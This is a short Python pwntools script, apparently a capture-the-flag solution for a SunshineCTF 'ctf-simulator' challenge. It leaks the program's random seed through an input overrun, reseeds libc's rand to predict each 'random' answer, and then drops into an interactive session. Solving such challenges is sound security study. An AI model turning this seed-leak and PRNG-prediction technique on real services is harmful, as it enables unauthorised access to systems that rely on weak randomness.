from pwn import *
import ctypes
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

if args.REMOTE:
  p = remote('sunshinectf.games', 22000)
else:
  p = process('./ctf-simulator')

sla('[>] ', 'a'*20)
seed = u32(rcu('a'*20,','))
print('seed = '+hex(seed))
LIBC.srand(seed)

i = 10
while (i<999999999):
  val = LIBC.rand() % i + 1
  sla('[>] ', str(val))
  i *= 10

p.interactive()

